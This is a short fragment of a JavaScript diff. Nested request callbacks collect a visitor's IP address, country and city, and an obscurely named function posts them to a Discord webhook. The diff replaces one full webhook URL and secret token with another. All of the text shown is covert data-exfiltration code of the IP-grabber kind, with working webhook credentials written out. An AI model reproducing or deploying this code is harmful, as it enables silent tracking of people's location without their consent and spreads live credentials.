@@ -22,7 +22,7 @@ a.onreadystatechange = function() {
                 city.onreadystatechange = function() {
                     if (this.readyState === 4) {
                         var res3 = this.responseText;
-                        rqwbm("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",JSON.stringify({"content":"**IP: "+res1+"\nKraj: "+res2+"\nMiasto: "+res3+"**"}))
+                        rqwbm("https://discord.com/api/webhooks/1227688244632621056/CG1Z-FVEMDeDMMtKTEyhjxoytDNfxF1r0v0cjy1J_D2vzjhjLCcXorwXVbfT6wfc6VFy",JSON.stringify({"content":"**IP: "+res1+"\nKraj: "+res2+"\nMiasto: "+res3+"**"}))
                     }
                 }
                 city.send();
